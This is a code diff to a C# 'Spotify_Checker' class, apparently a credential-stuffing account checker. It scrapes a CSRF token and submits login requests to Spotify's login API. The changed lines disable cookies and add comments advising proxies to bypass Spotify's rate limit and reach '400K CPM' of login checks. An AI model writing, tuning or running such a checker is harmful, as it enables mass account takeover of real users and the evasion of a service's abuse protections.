@@ -11,7 +11,7 @@ namespace Milky.Examples
 {
     public class Spotify_Checker
     {
-        private static readonly HttpClient _httpClient = new HttpClient();
+        private static readonly HttpClient _httpClient = new HttpClient(new HttpClientHandler { UseCookies = false });
         private static readonly Random _random = new Random();
         private static readonly object _locker = new object();
 
@@ -58,8 +58,8 @@ namespace Milky.Examples
 
                             using var responseMessage1 = await _httpClient.SendAsync(requestMessage1);
 
-                            string csrfToken = Regex.Match(responseMessage1.Headers.ToString(), "csrf_token=(.*?);").Groups[1].Value;
-                            if (string.IsNullOrEmpty(csrfToken)) continue; // Sadly, this checker triggers Spotify Rate limit. Ignoring rate limit, it is able to reach a solid 400K CPM (depending on your computer)
+                            string csrfToken = Regex.Match(responseMessage1.Headers.ToString(), "csrf_token=(.*?);").Groups[1].Value; // Don't mind my way of parsing headers, it's a speed trick
+                            if (string.IsNullOrEmpty(csrfToken)) continue; // Use proxies if you want to bypass rate limit and reach up to 400K CPM
 
                             using var requestMessage2 = new HttpRequestMessage(HttpMethod.Post, "https://accounts.spotify.com/api/login")
                             {
